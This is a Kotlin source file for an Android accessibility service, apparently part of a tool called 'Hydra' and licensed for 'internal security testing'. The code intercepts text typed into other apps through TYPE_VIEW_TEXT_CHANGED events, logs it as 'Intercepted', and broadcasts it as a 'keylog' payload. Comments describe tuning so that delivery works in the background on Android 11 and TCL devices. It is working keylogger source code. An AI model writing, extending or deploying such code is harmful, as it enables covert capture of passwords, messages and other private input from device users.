
/*
Copyright (c) 2026 José María Micoli
Licensed under AGPLv3

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package com.hydra.client

import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import android.content.Intent
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class HydraAccessibilityService : AccessibilityService() {

    private val TAG = "HydraAccessibility"
        private var lastCapturedText: String = ""
        override fun onAccessibilityEvent(event: AccessibilityEvent) {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = event.text.toString().removeSurrounding("[", "]")
                
                if (text.isNotEmpty()) {
                    Log.d("HydraCapture", "Intercepted: $text")

                    val intent = Intent("com.hydra.ACTION_KEYLOG")
                    intent.putExtra("payload", text)
                    
                    // Priority flag ensures Android 11 delivers this even in background
                    intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND)
                    intent.setPackage(packageName) 
                    
                    sendBroadcast(intent)
                }
            }
        }

    private fun logData(packageID: String, content: String) {
        val timeStamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val logEntry = "[$packageID] $content"

        // Broadcast to the main service via Intent
        val intent = Intent("HYDRA_KEYLOG_UPDATE")
        intent.putExtra("DATA", logEntry)
        sendBroadcast(intent)
    }

    override fun onInterrupt() {
        Log.e(TAG, "[-] Accessibility Service Interrupted")
    }

    override fun onServiceConnected() {
        // Do NOT call super.onServiceConnected() first on TCL Android 11
        // Manually build the info object to ensure the OS accepts it
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or 
                         AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            // flagRetrieveInteractiveWindows is required for TCL UI
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or 
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        
        this.serviceInfo = info
        Log.i(TAG, "=== SENSOR TCL ACTIVADO Y VINCULADO ===")
    }
}